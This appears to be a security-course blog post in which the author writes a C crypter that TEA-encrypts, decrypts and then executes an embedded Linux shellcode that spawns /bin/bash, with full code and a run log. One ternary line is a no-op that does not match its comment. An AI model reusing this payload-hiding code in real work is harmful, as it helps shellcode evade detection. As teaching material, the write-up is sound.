# SLAE course
This blog post has been created for completing the requirements of the SecurityTube Linux.

Assembly Expert certification:
* https://www.pentesteracademy.com/course?id=3

Student ID: SLAE-XXXXX

## Assignment#7: What to do ?
For this assignment we have to:
* Create a custom crypter
    * Feel free to use any existing encryption schema
    * Can use any programming language

Now, let's get to work.
=

### 1) Introduction:
In order to realize this assignment, I chose to create a C code taking a shellcode (in hexadecimal format) and apply a TEA (Tiny Encryption Algorithm).

Some pretty good links:
* https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm
* https://codereview.stackexchange.com/questions/187402/tiny-encryption-algorithm-implementation-in-c

### 2) What is a TEA ?
In cryptography, the Tiny Encryption Algorithm (TEA) is a block cipher notable for its simplicity of description and implementation, typically a few lines of code.

The cipher details can be found below:|
* Key sizes:	128 bits
* Block sizes:	64 bits
* Structure:	Feistel network
* Rounds:	    Variable; recommended 64 Feistel rounds (32 cycles)

### The encryption and decryption functions can be found below:
```c
/* This function is used to encrypt a message. The message is divided in 64 bits blocks and then encrypt with the 128 bits key.
:param uint32_t v[2] -> the message to encrypt:
:param uint32_t k[4] -> the key used to encrypt:
*/
void encrypt (uint32_t v[2], uint32_t k[4]) 
{

    uint32_t v0=v[0], v1=v[1], sum=0, i;           // set up //

    uint32_t delta=0x9E3779B9;                     // a key schedule constant //

    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //


    for (i=0; i < 32; i++) {                       // basic cycle start //
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }                                              // end cycle //
                                              
    v[0]=v0; 
    v[1]=v1;                                       
}

/* This function is used to decrypt a message. The message is divided in 64 bits blocks and then decrypt with the 128 bits key.
:param uint32_t v[2] -> the message to decrypt:
:param uint32_t k[4] -> the key used to decrypt:
*/
void decrypt (uint32_t v[2], uint32_t k[4]) 
{

    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  // set up 

    uint32_t delta=0x9e3779b9;                     // a key schedule constant 

    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //

    for (i=0; i<32; i++) {                         // basic cycle start 
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;
    }                                              // end cycle 
    v[0]=v0; 
    v[1]=v1;
}
```
The main code can be divided in 6 funtions:

| C function        | Details       |
| ----------------- |:-------------:| -----:|
| encrypt           | encrypt the shellcode |
| decrypt           | decrypt the shellcode |
| encryptBlocks     | devide the shellcode in blocks of 64 bits and then call the encrypt function      |
| decryptBlocks     | devide the crypted shellcode in blocks of 64 bits and then call the decrypt function |
| printShellcode    | print the length and the shellcode      |
| main              | the main function      |

### The whole C code can be found below:
```c
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* This function is used to encrypt a message. The message is divided in 64 bits blocks and then encrypt with the 128 bits key.
:param uint32_t v[2] -> the message to encrypt:
:param uint32_t k[4] -> the key used to encrypt:
*/
void encrypt (uint32_t v[2], uint32_t k[4]) 
{

    uint32_t v0=v[0], v1=v[1], sum=0, i;           // set up //

    uint32_t delta=0x9E3779B9;                     // a key schedule constant //

    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //


    for (i=0; i < 32; i++) {                       // basic cycle start //
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
    }                                              // end cycle //
                                              
    v[0]=v0; 
    v[1]=v1;                                       
}

/* This function is used to decrypt a message. The message is divided in 64 bits blocks and then decrypt with the 128 bits key.
:param uint32_t v[2] -> the message to decrypt:
:param uint32_t k[4] -> the key used to decrypt:
*/
void decrypt (uint32_t v[2], uint32_t k[4]) 
{

    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  // set up 

    uint32_t delta=0x9e3779b9;                     // a key schedule constant 

    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //

    for (i=0; i<32; i++) {                         // basic cycle start 
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;
    }                                              // end cycle 
    v[0]=v0; 
    v[1]=v1;
}

/* This function is used to divided the shellcode in block of 64 bits and then call the encrypt function.
:param char *shellcode  -> the shellcode to encrypt:
:param uint32_t k[4]    -> the key used to encrypt:
*/
void encryptBlocks(char *shellcode, uint32_t *key)
{   
    // Declare variables
    int i = 0, blockcount;
    
    // Devide the shellcode in blockcount
    // 8 is the number of Bytes (8 * 8 == 64 bits)
    blockcount = strlen(shellcode) / 8;

    // Conditionnal ternary operator
    // --> Check if the blockcount == 0
    //     --> if so: blockcount == 1
    //     --> else: blockcount = blockcount
    blockcount = 0 ? 1 : blockcount;

    // For each block of 64 bits the shellcode is encrypted with the given key
    while (i < blockcount) {
        encrypt((uint32_t *)shellcode + (i * 2), key);
        i += 1;
    }
}


/* This function is used to divided the encrypted shellcode in block of 64 bits and then call the decrypt function.
:param char *shellcode -> the shellcode to decrypt:
:param uint32_t k[4] -> the key used to decrypt:
*/
void decryptBlocks(char *shellcode, uint32_t *key)
{   
    // Declare variables
    int i = 0, blockcount;
    
    // Devide the shellcode in blockcount
    // 8 is the number of Bytes (8 * 8 == 64 bits)
    blockcount = strlen(shellcode) / 8;

    // Conditionnal ternary operator
    // --> Check if the blockcount == 0
    //     --> if so: blockcount == 1
    //     --> else: blockcount = blockcount
    blockcount = 0 ? 1 : blockcount;

    // For each block of 64 bits the shellcode is encrypted with the given key
    while (i < blockcount) {
        decrypt((uint32_t *)shellcode + (i * 2), key);
        i += 1;
    }
}


/* This function is used to get the shellcode length and print it
:param char *shellcode -> the shellcode used:
*/
void printShellcode(char *shellcode)
{
    int i;
    // Print the shellcode length
    printf("Shellcode length = %d\n", strlen(shellcode));
    // Loop for each element in the shellcode array
    for(i = 0; i < strlen(shellcode); i++)
    {
        // Print their hexadecimal values
        printf("\\x%02x", (unsigned char)(int)shellcode[i]);
    }
    // Add a newline
    printf("\n");
}

int main()
{
    // 128 bits encrypt key (32 * 4 bits)
    uint32_t key[4] = {0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD};

    // Shellcode to encrypt
    unsigned char shellcode[] = "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";

    // Print the unencrypted shellcode
    printShellcode(shellcode);
    // Encrypt the shellcode
    encryptBlocks(shellcode, key);

    // Print the crypted shellcode
    printShellcode(shellcode);

    // Decrypt the shellcode
    decryptBlocks(shellcode, key);

    // Print the unencrypted shellcode
    printShellcode(shellcode);

    // Convert the shellcode variable into a pointer to a function	
    int (*ret)() = (int(*)())shellcode;
    printf("Executing Shellcode....\n\n\n");
    // Execute the function
    ret();
    
    return 0;
}
```

Let's compile it and run it:
```console
kali@kali:/tmp$ ./tiny_encryption_algorithm 
Shellcode length = 40
\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68
Shellcode length = 40
\x38\xd1\x0d\x2b\xdf\xc6\xf2\x1a\x97\x2b\xfc\x72\x5e\xcf\x67\x39\x10\xa7\xd4\x41\x29\x0a\x8e\xf6\xe2\xcb\x7e\x5e\x20\xff\x86\x71\x81\xf2\xca\x0b\x7d\x1a\x3c\xff
Shellcode length = 40
\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68
Executing Shellcode....


kali@kali:/tmp$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
kali@kali:/tmp$ exit
exit
```